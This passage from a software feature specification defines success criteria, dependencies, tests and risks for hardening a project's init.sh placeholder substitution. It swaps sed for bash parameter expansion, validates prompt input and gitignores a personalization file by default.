- **SC-002**: Post-merge `/security` re-scan against `main` HEAD produces zero new findings within the substitution surface this feature touched.

### Substitution-Semantics Correctness

- **SC-003**: `replace_in_files()` is removed from `scripts/init.sh`; replaced by a loop calling `aod_template_substitute_placeholders` per file. `init.sh` sources `.aod/scripts/bash/template-substitute.sh` exactly once. The flow is reordered so that `.aod/personalization.env` is written BEFORE the substitution loop, and `aod_template_load_personalization_env` is called BEFORE `aod_template_substitute_placeholders`.
- **SC-004**: `aod_template_assert_no_residual` is called on every substituted file after the substitution loop; init halts non-zero on any residual `{{KEY}}` with a message naming the file and the orphan placeholder.
- **SC-005**: Adversarial-input fixture-replay test produces byte-identical output to a recorded baseline tree across at least 13 inputs (per Test-2 corpus).

### Input Validation Correctness

- **SC-006**: All four `read -p` prompts at `scripts/init.sh:24-28` are wrapped in `aod_init_read_validated`. Rejection on newline / NUL / control char / over-length is observed; re-prompt loop runs up to 3 times; init exits non-zero on the 3rd failure.

### Adopter-Posture Defaults

- **SC-007**: `.gitignore` contains `.aod/personalization.env` (verified at HEAD). `contracts/personalization-schema.md` documents local-only as the default. CHANGELOG entry includes the migration command.
- **SC-008**: Constitution cleanup uses `.aod/templates/constitution-clean.md` copy (no `sed`). Post-init `.aod/memory/constitution.md` matches `.aod/templates/constitution-clean.md` byte-for-byte.

### PROJECT_PATH Disposition

- **SC-009**: Adjudicated disposition (Option (b) default; Option (a) fallback if internal-tooling search surfaces a wired consumer) is implemented per FR-007. Internal-tooling search outcome recorded in this spec.

### ADR + Governance + Release Trigger

- **SC-010**: Public ADR-038 is authored at `docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md`. Status: `Accepted` (post dual-commit). Contains Status, Context, Decision, Alternatives Considered, Consequences, Related Decisions (citing ADR-009), Related Findings (5 vuln_ids), References (Daniel Wood LinkedIn URL + web.archive.org snapshot).
- **SC-011**: Triple Triad sign-off recorded on `tasks.md` (PM + Architect + Team-Lead).
- **SC-012**: PR title is Conventional-Commits-formatted as `feat(248): harden init.sh substitution surface — sed → bash param expansion + input validation + gitignore default`. Belt-and-suspenders release verification per `.claude/rules/git-workflow.md` R12.

### Cross-Cutting

- **SC-013**: Zero new runtime dependencies — empty diff on `pyproject.toml`, `requirements*.txt`, `package.json`, or any other dependency manifest.
- **SC-014**: All Regression Protection Plan tests (Test-1, Test-2, Test-3, Test-4, Test-5', Test-6, Test-7) pass on macOS (bash 3.2 default) AND Linux (bash 4+) via the existing pytest CI matrix. `find . -name '*.bats'` returns zero matches (NFR-001 + FR-011).

### Public Visibility Action (PM-controlled, NOT a DoD gate)

- **SC-015 (Public Visibility Action)**: A one-line comment template is provided ready for the user to paste on Daniel Wood's 2026-05-02 LinkedIn thread (post-release-please-merge, within 5 business days per Team-Lead Pass 1 M-3); posting is at user discretion. Decoupled from F-248's merge calendar per Architect Pass 1 L-3. This SC is **not a DoD gate** — feature closure does not depend on the LinkedIn post.

## Dependencies and Assumptions

### Dependencies

- **Existing safe substitution function**: `aod_template_substitute_placeholders` at `.aod/scripts/bash/template-substitute.sh:318-411`. Verified during research. Bash parameter expansion `${str//pat/rep}`. Contract-defined, unit-tested, used by `/aod.update`. F-1 wires `init.sh` to this existing function — no new substitution code is authored.
- **Existing residual scanner**: `aod_template_assert_no_residual` at `.aod/scripts/bash/template-substitute.sh:414-457`. Verified during research.
- **Existing snapshot loader**: `aod_template_load_personalization_env` at `.aod/scripts/bash/template-substitute.sh:143-234`. Verified during research.
- **Existing pytest CI matrix**: `macos-latest` + `ubuntu-latest` runs the existing `tests/scripts/test_*.py` suite. F-1 adds tests to this already-running matrix; no new workflow file.
- **F-2 reuse contract**: F-2 (BLP-02 Wave 2 — defaults.env strict KV parser) reuses the **validation triplet pattern** documented in ADR-038 (regex-validate → reject-on-mismatch → `printf -v` assignment), NOT the `aod_init_read_validated` function itself. F-1 establishes the pattern; F-2 reuses it in a non-interactive file-parse context.

### Assumptions

- **No wired consumer of `.claude/mcp-config.json`** in the internal-tooling search paths (`.aod/scripts/`, `.claude/agents/`, `.claude/commands/`, `Makefile`, `scripts/`). Default disposition is Option (b) — remove the file. If the assumption fails (search surfaces a wired consumer), the disposition flips to Option (a) and `PROJECT_PATH` is added to the canonical placeholder array.
- **Daniel Wood's LinkedIn note is durable enough for archival snapshot**. The `web.archive.org` snapshot mandated in ADR-038 §References is the canonical evidence trail; the live LinkedIn URL is best-effort.
- **release-please cadence is generally < 30s post-merge** but can vary. The belt-and-suspenders empty-marker-commit pattern (F-212 lessons) closes the cadence-variance gap.
- **bash 3.2 is available on macos-latest in CI**. Validated during research. No fallback needed.
- **Adopters who already committed `.aod/personalization.env` are willing to run a one-time migration command**. CHANGELOG provides the copy-pasteable command.

## Regression Protection Plan (referenced from PRD §Regression Protection Plan)

The full 7-test Regression Protection Plan is detailed in [PRD §Regression Protection Plan](../../docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md#regression-protection-plan). Summary:

- **Test-1**: Fixture-replay byte-comparison (`tests/scripts/test_init_sh_substitution.py`) — invokes `init.sh` via `subprocess.run` against the canonical fixture; byte-compares the resulting tree against `tests/fixtures/init-baseline-tree/`.
- **Test-2**: Adversarial-input substitution test cases (`tests/scripts/test_init_sh_adversarial.py`) — exercises ≥13 input cases including the 4-byte literal `a\nb` sequence, no-trailing-newline files, multibyte UTF-8, NUL paste, control characters, over-length input.
- **Test-3**: Cross-platform CI matrix — existing pytest matrix; no new wiring.
- **Test-4**: Constitution byte-compare (`tests/scripts/test_init_sh_constitution.py`) — asserts post-init `.aod/memory/constitution.md` equals `.aod/templates/constitution-clean.md` byte-for-byte.
- **Test-5'**: Self-delete preservation (`tests/scripts/test_init_sh_self_delete.py`) — asserts `scripts/init.sh` does not exist after a successful run. Replaces the original Test-5 (re-init parity) per Architect M-3 + Team-Lead Q-3 Option (b).
- **Test-6**: Manual smoke test on fresh checkout (gating). [MANUAL-ONLY] gating action by the closing operator before marking the feature ready.
- **Test-7**: Post-merge `/security` re-scan. [MANUAL-ONLY] verification by the closing operator at `/aod.deliver`.

## Risks (referenced from PRD §Risks)

The full risk register is in [PRD §Risks](../../docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md#risks). Top-of-mind risks for the spec:

- **R-1 (MEDIUM)**: bash 3.2 compatibility regression — mitigated by NFR-001 + cross-platform CI matrix.
- **R-2 (MEDIUM)**: Substitution-semantics drift on edge-case files — mitigated by Test-1 + Test-2 corpus including no-trailing-newline and literal `a\nb` cases.
- **R-5 (LOW)**: PROJECT_PATH Option (b) breaks a downstream adopter who wired `mcp-config.json` — mitigated by the internal-tooling search artifact in FR-007 + Option (a) fallback path.

## References

- **PRD**: [docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md](../../docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md)
- **Research**: [research.md](research.md)
- **Issue**: [#248](https://github.com/davidmatousek/tachi/issues/248)
- **Existing safe function**: [.aod/scripts/bash/template-substitute.sh:318-411](../../.aod/scripts/bash/template-substitute.sh)
- **Vulnerable code (target for removal)**: [scripts/init.sh:117-159](../../scripts/init.sh) (`replace_in_files`); [scripts/init.sh:24-28](../../scripts/init.sh) (`read -p` prompts); [scripts/init.sh:235-241](../../scripts/init.sh) (constitution sed)
- **Prior ADR superseded on mechanism axis**: [docs/architecture/02_ADRs/ADR-009-template-variable-expansion-scope.md](../../docs/architecture/02_ADRs/ADR-009-template-variable-expansion-scope.md)
- **Daniel Wood LinkedIn note**: 2026-05-02 (URL pinned in ADR-038 §References with `web.archive.org` snapshot per Team-Lead Pass 1 L-1)
- **F-212 release-please incident**: `.claude/rules/git-workflow.md` Reference Incident section (informs FR-010 belt-and-suspenders pattern)
- **Constitution**: [.aod/memory/constitution.md](../../.aod/memory/constitution.md)
- **Git workflow rules**: [.claude/rules/git-workflow.md](../../.claude/rules/git-workflow.md)
- **BLP-02 strategy**: [_internal/strategy/BLP-02-enterprise-hardening.md](../../_internal/strategy/BLP-02-enterprise-hardening.md)
